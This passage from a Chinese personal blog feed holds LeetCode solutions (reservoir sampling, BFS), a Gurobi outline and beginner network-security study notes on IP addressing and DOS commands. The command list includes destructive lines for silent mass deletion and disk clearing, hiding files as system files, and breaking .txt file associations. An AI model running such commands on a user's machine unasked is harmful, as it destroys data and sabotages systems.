+\frac{n-1}{n}\times\frac{n-2}{n-1}\times...\times\frac{k}{k+1}\times1=\frac{k}{n}</script><p>这是符合要求的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i = 0</span><br><span class="line">s = NULL</span><br><span class="line">for line in lines:</span><br><span class="line">	i = i + 1</span><br><span class="line">	r = random.choice(0,1)</span><br><span class="line">	if r &lt; 1/i:</span><br><span class="line">		s = line #替换</span><br></pre></td></tr></table></figure>
+<h2 id="关于为什么替换"><a href="#关于为什么替换" class="headerlink" title="关于为什么替换"></a>关于为什么替换</h2><p>替换就是采样，不断地替换或者不替换表示当前是否采样到该数据；</p>
+<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h4 id="398-Random-Pick-Index"><a href="#398-Random-Pick-Index" class="headerlink" title="398. Random Pick Index"></a><a href="https://leetcode.cn/problems/random-pick-index/">398. Random Pick Index</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.position = defaultdict(list)</span></span><br><span class="line"><span class="string">        for i,num in enumerate(nums):</span></span><br><span class="line"><span class="string">            self.position[num].append(i)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        #print(self.position)</span></span><br><span class="line"><span class="string">        #print(choice(self.position[target]))</span></span><br><span class="line"><span class="string">        return choice(self.position[target])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#官方解答1</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.pos = defaultdict(list)</span></span><br><span class="line"><span class="string">        for i, num in enumerate(nums):</span></span><br><span class="line"><span class="string">            self.pos[num].append(i)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        return choice(self.pos[target])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#官方题解2 蓄水池采样</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.nums = nums</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        ans = cnt = 0</span></span><br><span class="line"><span class="string">        for i, num in enumerate(self.nums):</span></span><br><span class="line"><span class="string">            if num == target:</span></span><br><span class="line"><span class="string">                cnt += 1  # 第 cnt 次遇到 target</span></span><br><span class="line"><span class="string">                if randrange(cnt) == 0:</span></span><br><span class="line"><span class="string">                    ans = i</span></span><br><span class="line"><span class="string">            #print(&quot;ans=&quot;,ans,&quot;cnt=&quot;,cnt)</span></span><br><span class="line"><span class="string">        return ans</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">        self.nums = nums</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self, target: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        res = indx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.nums):</span><br><span class="line">            <span class="keyword">if</span> num == target:</span><br><span class="line">                <span class="comment">#用 cnt 记录，表示从 (0,cnt) 中随机抽取一个数</span></span><br><span class="line">                <span class="comment">#用来均衡概率，使抽到的概率每次都为 1/（targe的数量)</span></span><br><span class="line">                indx += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> randrange(indx) == <span class="number">0</span>:</span><br><span class="line">                    <span class="comment">#print(randrange(indx))</span></span><br><span class="line">                    res = i</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Solution object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = Solution(nums)</span></span><br><span class="line"><span class="comment"># param_1 = obj.pick(target)</span></span><br></pre></td></tr></table></figure>
+<h4 id="497-Random-Point-in-Non-overlapping-Rectangles"><a href="#497-Random-Point-in-Non-overlapping-Rectangles" class="headerlink" title="497. Random Point in Non-overlapping Rectangles"></a><a href="https://leetcode.cn/problems/random-point-in-non-overlapping-rectangles/">497. Random Point in Non-overlapping Rectangles</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rects: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>):</span><br><span class="line">        self.rectangle = rects</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        SumPoints = <span class="number">0</span></span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i,(x1,y1,x2,y2) <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.rectangle):</span><br><span class="line">            curPoints = (x2-x1+<span class="number">1</span>) * (y2-y1+<span class="number">1</span>)    <span class="comment">#当前矩形包含的点数</span></span><br><span class="line">            SumPoints += curPoints  <span class="comment">#总点数</span></span><br><span class="line">            <span class="keyword">if</span> random.randint(<span class="number">0</span>,SumPoints) &lt; curPoints:</span><br><span class="line">                <span class="comment">#这个判断的依据</span></span><br><span class="line">                <span class="comment">#如：第一次加 curSum=9,第二次加 curSum=9+12=21</span></span><br><span class="line">                <span class="comment">#第 1 次采样一定取第 1 个矩形</span></span><br><span class="line">                <span class="comment">#第 2 次采样，取到小于 12 取第 2 个矩形，12~21 取第 1 个矩形（未变）</span></span><br><span class="line">                <span class="comment">#试下等概率采样</span></span><br><span class="line">                idx = i</span><br><span class="line">        x1,y1,x2,y2 = self.rectangle[idx]</span><br><span class="line">        <span class="keyword">return</span> [x1+random.randint(<span class="number">0</span>,x2-x1),y1+random.randint(<span class="number">0</span>,y2-y1)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Solution object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = Solution(rects)</span></span><br><span class="line"><span class="comment"># param_1 = obj.pick()</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Code_Algo</category>
+      </categories>
+      <tags>
+        <tag>Math</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gurobi-2-ex-diet</title>
+    <url>/2022/06/01/Gurobi/Gurobi-2-ex-diet/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Gurobi_Outline</title>
+    <url>/2022/05/30/Gurobi/Gurobi_Outline/</url>
+    <content><![CDATA[<h1 id="Gurobi-建模的基本流程"><a href="#Gurobi-建模的基本流程" class="headerlink" title="Gurobi 建模的基本流程"></a>Gurobi 建模的基本流程</h1><p>这样定义会使整个模型易读</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = gurobipy.Model(<span class="string">&quot;Model_Name&quot;</span>)	<span class="comment">#模型</span></span><br><span class="line"></span><br><span class="line">var = m.addVar(vtype = var_type,name=<span class="string">&quot;var_name&quot;</span>)	<span class="comment">#增加变量</span></span><br><span class="line"><span class="comment">#...More vars</span></span><br><span class="line"></span><br><span class="line">m.setObject(objective_expression,objective_sense)	<span class="comment">#目标函数</span></span><br><span class="line"></span><br><span class="line">m.addConstr(constraint,constraint_name)	<span class="comment">#约束条件</span></span><br><span class="line"><span class="comment">#...More constraints</span></span><br><span class="line"></span><br><span class="line">m.optimize()	<span class="comment">#优化模型</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ossimg.yzitc.com/2022/05/30/930c4d13cf906.png"></p>
+]]></content>
+      <categories>
+        <category>MILP_Learning</category>
+      </categories>
+      <tags>
+        <tag>Gurobi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LC 5.24 t.965. Univalued Binary Tree</title>
+    <url>/2022/05/25/Lc_daily/LC-5.24-t.965.-Univalued-Binary-Tree/</url>
+    <content><![CDATA[<h4 id="965-单值二叉树"><a href="#965-单值二叉树" class="headerlink" title="965. 单值二叉树"></a><a href="https://leetcode.cn/problems/univalued-binary-tree/">965. 单值二叉树</a></h4><p>难度：简单</p>
+<p>如果二叉树每个节点都具有相同的值，那么该二叉树就是<em>单值</em>二叉树。</p>
+<p>只有给定的树是单值二叉树时，才返回 <code>true</code>；否则返回 <code>false</code>。</p>
+<p><strong>示例 1：</strong></p>
+<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50104-pm.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[1,1,1,1,1,null,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
+<p><strong>示例 2：</strong></p>
+<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50050-pm.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[2,2,2,5,2]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
+<p><strong>提示：</strong></p>
+<ol>
+<li>给定树的节点数范围是 <code>[1, 100]</code>。</li>
+<li>每个节点的值都是整数，范围为 <code>[0, 99]</code> 。</li>
+</ol>
+<h5 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h5><ol>
+<li><p>深度优先，在判断到不等值时返回 False，一直相等，到遍历完返回 True</p>
+</li>
+<li><p>使用集合，无论采取哪种遍历方式，将所有值加入集合，并在最后判断集合的长度是否为 1 即可</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isUnivalTree</span>(<span class="params">self, root: TreeNode</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">#3 traverse</span></span><br><span class="line">        ttval = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">preorder</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            ttval.add(root.val)</span><br><span class="line">            preorder(root.left)</span><br><span class="line">            preorder(root.right)</span><br><span class="line"></span><br><span class="line">        preorder(root)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(ttval) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        #DFS</span></span><br><span class="line"><span class="string">        if not root:</span></span><br><span class="line"><span class="string">            return True</span></span><br><span class="line"><span class="string">        if root.left:</span></span><br><span class="line"><span class="string">            if root.val != root.left.val or not self.isUnivalTree(root.left):</span></span><br><span class="line"><span class="string">                return False</span></span><br><span class="line"><span class="string">        if root.right:</span></span><br><span class="line"><span class="string">            if root.val != root.right.val or not self.isUnivalTree(root.right):</span></span><br><span class="line"><span class="string">                return False</span></span><br><span class="line"><span class="string">        return True</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h5 id="前中后序遍历的-demo"><a href="#前中后序遍历的-demo" class="headerlink" title="前中后序遍历的 demo"></a>前中后序遍历的 demo</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">root</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment">#preorder(root)</span></span><br><span class="line">    order(root.left)</span><br><span class="line">    <span class="comment">#inorder(root)</span></span><br><span class="line">    order(root.right)</span><br><span class="line">    <span class="comment">#postorder(root)</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>LeetCode_daily</category>
+      </categories>
+      <tags>
+        <tag>DFS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安学习_D.1_环境部署</title>
+    <url>/2022/05/25/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>使用 Vmware 装上几个旧window系统的虚拟机 win-xp/2003/7/2008</p>
+<h2 id="winxp"><a href="#winxp" class="headerlink" title="winxp"></a>winxp</h2><p>我的配置：</p>
+<ol>
+<li>使用的 winxp_professional 镜像(来自 msdn.itellyou)，删掉了 打印机，声卡</li>
+<li>分配 40G 空间（20+20）</li>
+<li>关掉了防火墙和自动更新</li>
+<li>至此，拍摄快照并克隆虚拟机（链接）<ul>
+<li>链接克隆和完整克隆的区别：链接克隆创建一个主虚拟机的子链接， 与主虚拟机并存（占用空间小）；完整克隆复制出一个独立的虚拟机（占用和主虚拟机一样大的空间）</li>
+</ul>
+</li>
+</ol>
+<h2 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h2><p>同上</p>
+<h2 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h2><p>没设密码</p>
+<h2 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h2><p>同上</p>
+]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>CS_OP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LC 5.23 t.675 Cut Off Trees for Golf Event</title>
+    <url>/2022/05/25/Lc_daily/LC-5.23-t.675-Cut-Off-Trees-for-Golf-Event/</url>
+    <content><![CDATA[<h4 id="5-23-675-为高尔夫比赛砍树"><a href="#5-23-675-为高尔夫比赛砍树" class="headerlink" title="5.23  675. 为高尔夫比赛砍树"></a>5.23  <a href="https://leetcode.cn/problems/cut-off-trees-for-golf-event/">675. 为高尔夫比赛砍树</a></h4><p>难度：困难</p>
+<p>你被请来给一个要举办高尔夫比赛的树林砍树。树林由一个 <code>m x n</code> 的矩阵表示， 在这个矩阵中：</p>
+<ul>
+<li><code>0</code> 表示障碍，无法触碰</li>
+<li><code>1</code> 表示地面，可以行走</li>
+<li><code>比 1 大的数</code> 表示有树的单元格，可以行走，数值表示树的高度</li>
+</ul>
+<p>每一步，你都可以向上、下、左、右四个方向之一移动一个单位，如果你站的地方有一棵树，那么你可以决定是否要砍倒它。</p>
+<p>你需要按照树的高度从低向高砍掉所有的树，每砍过一颗树，该单元格的值变为 <code>1</code>（即变为地面）。</p>
+<p>你将从 <code>(0, 0)</code> 点开始工作，返回你砍完所有树需要走的最小步数。 如果你无法砍完所有的树，返回 <code>-1</code> 。</p>
+<p>可以保证的是，没有两棵树的高度是相同的，并且你至少需要砍倒一棵树。</p>
+<p><strong>示例 1：</strong></p>
+<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees1.jpg" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,4],[7,6,5]]</span><br><span class="line">输出：6</span><br><span class="line">解释：沿着上面的路径，你可以用 6 步，按从最矮到最高的顺序砍掉这些树。</span><br></pre></td></tr></table></figure>
+<p><strong>示例 2：</strong></p>
+<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees2.jpg" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,0],[7,6,5]]</span><br><span class="line">输出：-1</span><br><span class="line">解释：由于中间一行被障碍阻塞，无法访问最下面一行中的树。</span><br></pre></td></tr></table></figure>
+<p><strong>示例 3：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[2,3,4],[0,0,5],[8,7,6]]</span><br><span class="line">输出：6</span><br><span class="line">解释：可以按与示例 1 相同的路径来砍掉所有的树。</span><br><span class="line">(0,0) 位置的树，可以直接砍去，不用算步数。</span><br></pre></td></tr></table></figure>
+<p><strong>提示：</strong></p>
+<ul>
+<li><code>m == forest.length</code></li>
+<li><code>n == forest[i].length</code></li>
+<li><code>1 &lt;= m, n &lt;= 50</code></li>
+<li><code>0 &lt;= forest[i][j] &lt;= 109</code></li>
+</ul>
+<h5 id="思路1：排序＋广搜"><a href="#思路1：排序＋广搜" class="headerlink" title="思路1：排序＋广搜"></a>思路1：排序＋广搜</h5><blockquote>
+<p>类似 <a href="https://leetcode.cn/problems/pacific-atlantic-water-flow/">417. 太平洋大西洋水流问题</a> 都是四个方向的广搜，但限制条件不同</p>
+<p>先将需要砍掉的树按照树高度排序，需要记录坐标和高度 <code>(index_x,index_y,height)</code>，然后使用广度优先从四个方向搜索，搜索之前建立<code>visit[]</code>数组记录是否搜索过，可以先建立方向列表或直接遍历，原理是 <code>((x+1,y),(x-1,y),(x,y+1),(x,y-1))</code> 将满足限制条件的点再次入队。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cutOffTree</span>(<span class="params">self, forest: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#广度优先搜素</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">bfs</span>(<span class="params">sx,sy,tx,ty</span>):</span><br><span class="line">            row = <span class="built_in">len</span>(forest)</span><br><span class="line">            col = <span class="built_in">len</span>(forest[<span class="number">0</span>])</span><br><span class="line">            queue = deque([(<span class="number">0</span>,sx,sy)])</span><br><span class="line">            visit = &#123;(sx,sy)&#125;</span><br><span class="line">            <span class="keyword">while</span> queue:</span><br><span class="line">                distance,x,y = queue.popleft()</span><br><span class="line">                <span class="keyword">if</span> x == tx <span class="keyword">and</span> y == ty:</span><br><span class="line">                    <span class="keyword">return</span> distance</span><br><span class="line">                <span class="keyword">for</span> nx,ny <span class="keyword">in</span> ((x+<span class="number">1</span>,y),(x-<span class="number">1</span>,y),(x,y+<span class="number">1</span>),(x,y-<span class="number">1</span>)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0</span>&lt;=nx&lt;row <span class="keyword">and</span> <span class="number">0</span>&lt;=ny&lt;col <span class="keyword">and</span> forest[nx][ny] <span class="keyword">and</span> (nx,ny) <span class="keyword">not</span> <span class="keyword">in</span> visit:</span><br><span class="line">                        visit.add((nx,ny))</span><br><span class="line">                        queue.append((distance+<span class="number">1</span>,nx,ny))</span><br><span class="line">                    <span class="comment">#print(&quot;queue:&quot;,queue)</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#按照树的高度排序(indx_x,indx_y,height)</span></span><br><span class="line">        sort_trees = []</span><br><span class="line">        <span class="keyword">for</span> row,tree <span class="keyword">in</span> <span class="built_in">enumerate</span>(forest):</span><br><span class="line">            <span class="keyword">for</span> col,h <span class="keyword">in</span> <span class="built_in">enumerate</span>(tree):</span><br><span class="line">                <span class="keyword">if</span> h &gt; <span class="number">1</span>:</span><br><span class="line">                    sort_trees.append((row,col,h))</span><br><span class="line">        sort_trees = <span class="built_in">sorted</span>(sort_trees,key = <span class="keyword">lambda</span> x : x[<span class="number">2</span>])</span><br><span class="line">        <span class="built_in">print</span>(sort_trees)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        res = pre_x = pre_y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x,y,h <span class="keyword">in</span> sort_trees:</span><br><span class="line">            d = bfs(pre_x,pre_y,x,y)</span><br><span class="line">            <span class="keyword">if</span> d &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            res += d</span><br><span class="line">            pre_x,pre_y = x,y</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
+<h5 id="矩阵类-BFS-的-demo"><a href="#矩阵类-BFS-的-demo" class="headerlink" title="矩阵类 BFS 的 demo"></a>矩阵类 BFS 的 demo</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BFS</span>(<span class="params">sorce_val,target_val</span>):</span><br><span class="line">    row = <span class="built_in">len</span>(Matrix)</span><br><span class="line">    col = <span class="built_in">len</span>(Matrix[<span class="number">0</span>])</span><br><span class="line">    queue = deque([(need_val,indexs)])</span><br><span class="line">    visit = &#123;(pointer_index)&#125;</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        <span class="comment">#Limit the values stored in the queue based on conditions</span></span><br><span class="line">        need_val,indexs = queue.popleft()	</span><br><span class="line">        <span class="keyword">if</span> get_the_target_pointer:</span><br><span class="line">            <span class="comment">#conditions of return</span></span><br><span class="line">            <span class="keyword">return</span> need_val	</span><br><span class="line">        <span class="keyword">for</span> next_pointer <span class="keyword">in</span> all_directions:</span><br><span class="line">        <span class="comment">#eg: for nx,ny in ((x+1,y),(x-1,y),(x,y+1),(x,y-1)):</span></span><br><span class="line">        	<span class="comment">#search in all directions</span></span><br><span class="line">            <span class="keyword">if</span> fulfillment_of_conditions:</span><br><span class="line">            <span class="comment">#eg: if 0&lt;=nx&lt;row and 0&lt;=ny&lt;col and forest[nx][ny] and (nx,ny) not in visit:</span></span><br><span class="line">            	<span class="comment">#**Judgment Conditions**</span></span><br><span class="line">                visit.add((next_pointer))</span><br><span class="line">                queue.append((changed_need_val,indexs))</span><br><span class="line">    <span class="keyword">return</span> situation_of_ERR_or_boundary</span><br></pre></td></tr></table></figure>
+<h5 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h5><p>还可以用 Dijkstra 和 A*启发式算法求解，待续…</p>
+]]></content>
+      <categories>
+        <category>LeetCode_daily</category>
+      </categories>
+      <tags>
+        <tag>BFS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安学习-D-2-ip及一些命令</title>
+    <url>/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-2-ip%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<p>ip 相关知识复习及常用 win 系统下的命令</p>
+<h2 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h2><p>局域网：一般称为内网，同一个局域网中，所有IP必须在同一个网段才可以互相通信</p>
+<p>单局域网构成：交换机，网线，pc</p>
+<p>交换机：用来组建内网的局域网的设备</p>
+<h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>网络号（识别主机所在网络） + 主机号（识别网络中的主机）</p>
+<p>position_1.position_2.position_3.position_4  where  position  in [0,255]</p>
+<p>ISO定义五大类：（是以IP地址的第一位进行区分的）</p>
+<ul>
+<li><p>A类：（政府用）</p>
+<p>position_1 网络地址，position_2.position_3.position_4 主机地址</p>
+<p>范围：1.0.0.1—126.155.255.254</p>
+<p>私有地址和保留地址：</p>
+<p>① 10.X.X.X是私有地址（所谓的私有地址就是在互联网上不使用，而被用在局域网络中的地址）<br>② 127.X.X.X是保留地址，用做循环测试用</p>
+</li>
+<li><p>B类：（大中型企业用）</p>
+<p>position_1.position_2 网络地址，position_3.position_4 主机地址</p>
+<p>范围：128.0.0.1—191.255.255.254</p>
+<p>私有地址和保留地址：<br>① 172.16.0.0—172.31.255.255是私有地址<br>② 169.254.X.X是保留地址（如果你的IP地址是自动获取IP地址，而你在网络上又没有找到可用的<strong>DHCP服务器</strong>，就会得到其中一个IP）</p>
+</li>
+<li><p>C类：(个人使用，最常见)</p>
+<p>position_1.position_2.position_3 网络地址，position_4 主机地址</p>
+<p>范围：192.0.0.1—223.255.255.254</p>
+<p>私有地址：<br>192.168.X.X是私有地址</p>
+</li>
+<li><p>D类：（组播地址）</p>
+<p>不分网络地址和主机地址，它的第1个字节的前四位固定为1110</p>
+</li>
+<li><p>E类：（科研使用）<br>不分网络地址和主机地址，它的第1个字节的前四位固定为11110</p>
+</li>
+</ul>
+<h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>规定 ip 在哪个网段，如 ip ： 192.168.1.1 子网掩码：255.255.240.0</p>
+<p>二进制表示：</p>
+<p>11000000.10101000.00000001.00000001 ip</p>
+<p>11111111.11111111.11110000.00000000 子网掩码 （not = 00000000.00000000.00001111.11111111）</p>
+<p><strong>在子网掩码非 1 的部分为该网段可用地址</strong></p>
+<ul>
+<li>ip 与 子网掩码之间的关系：（保留地址）</li>
+</ul>
+<p>ip and 子网掩码 = 11000000.10101000.00000000.00000000 = 192.168.0.0 为<strong>网络号</strong></p>
+<p>ip or not 子网掩码 =  11000000.10101000.00001111.11111111 = 192.168.15.255 为<strong>广播地址</strong></p>
+<p>所以也可表示为 192.168.1.1/24 （表示该ip子网掩码长度24位1）</p>
+<p>参考： </p>
+<blockquote>
+<p><a href="https://blog.csdn.net/wujiafei_njgcxy/article/details/53672410">5类ip地址</a></p>
+<p><a href="https://www.bilibili.com/video/BV1v44y1g7Hf?p=1&amp;share_medium=iphone&amp;share_plat=ios&amp;share_session_id=791F56D7-CDA5-44B3-87C0-0ECC2828078D&amp;share_source=WEIXIN&amp;share_tag=s_i&amp;timestamp=1653636322&amp;unique_k=GzxogMD">什么是子网掩码</a></p>
+<p><a href="https://www.huaweicloud.com/zhishi/edits-15756158.html">ip地址和子网掩码的关系</a></p>
+</blockquote>
+<h2 id="网关（简单理解）"><a href="#网关（简单理解）" class="headerlink" title="网关（简单理解）"></a>网关（简单理解）</h2><p>相当于一个转换器，用于寻找要通信的另一方：</p>
+<p>pc向外发包</p>
+<p>1、首先判断目标IP与自己是否在 同一个网段</p>
+<p>2、如在同一个网段，则直接发出去，不找网关</p>
+<p>3、<strong>如不在同一个网段，则发包给网关</strong></p>
+<blockquote>
+<p>ping 命令：</p>
+<p>ping 目标IP地址                       #测试网络连通性，有去有回即为可以成功通路</p>
+<p>ping -t 目标IP地址                    #一直ping</p>
+<p>ping -n 数字 目标ip地址           #修改ping包的数量（默认4）</p>
+<p>ping -l 数字 目标ip地址            #修改ping 包的大小</p>
+<p>ipconfig      #查看ip基本信息</p>
+<p>ipconfig /all   #查看ip所有信息</p>
+</blockquote>
+<h2 id="DNS-域名系统-Domain-Name-System"><a href="#DNS-域名系统-Domain-Name-System" class="headerlink" title="DNS 域名系统 Domain Name System"></a>DNS 域名系统 <strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem</h2><p>它作为将<a href="https://baike.baidu.com/item/域名/86062">域名</a>和<a href="https://baike.baidu.com/item/IP地址/150859">IP地址</a>相互<a href="https://baike.baidu.com/item/映射/20402620">映射</a>的一个<a href="https://baike.baidu.com/item/分布式数据库/1238109">分布式数据库</a>，能够使人更方便地访问互联网</p>
+<blockquote>
+<p>手工解析域名</p>
+<p>nslookup www.baidu.com</p>
+</blockquote>
+<h2 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h2><blockquote>
+<p>cd..               返回上级目录</p>
+<p>cd\                返回根目录</p>
+<p>d:                 进入D盘</p>
+<p>cls                清空所有dos操作</p>
+<p>dir                显示当前盘符文件信息</p>
+<p>rd . /s/q        清空磁盘</p>
+<p><strong>浏览文件</strong></p>
+<p>type 文件名.扩展名                 显示</p>
+<p>type 文件名.扩展名 |more       分页显示</p>
+<p>例如：dir c:\windows |more</p>
+<p><strong>创建文件</strong></p>
+<p>md 文件夹名称                创建文件夹</p>
+<p>echo “内容”&gt;文件名         创建文件</p>
+<p><em>还要其他方式</em></p>
+<p><strong>删除文件</strong></p>
+<p>del *.txt                  删除所有txt结尾的文件</p>
+<p>del <em>.</em>                    删除文件</p>
+<p>del <em>.</em> /s/q             无提示删除</p>
+<p>attrib +h 文件名         隐藏文件夹</p>
+<p>attrib -h 文件名          取消文件夹</p>
+<p>attrib +h +s +a 文件名              将文件夹隐藏设为系统文件</p>
+<p>dir /a                          显示当前磁盘所有包括系统文件</p>
+<p>快速生成一个空文件（有大小）</p>
+<p>fsutil file createnew c:\system.ini 数字       在c盘创建文件指定文件大小</p>
+<p><strong>修改关联</strong></p>
+<p>参考：<a href="https://cloud.tencent.com/developer/news/682376">assoc 修改文件关联</a></p>
+<p>assoc .txt=exefile         修改打开txt文件的程序 使其无法打开</p>
+<p>assoc .txt=txtfile           恢复</p>
+<p>(未成功)</p>
+<p><strong>shutdown</strong></p>
+<p>shutdown -s -t 100 定时关机</p>
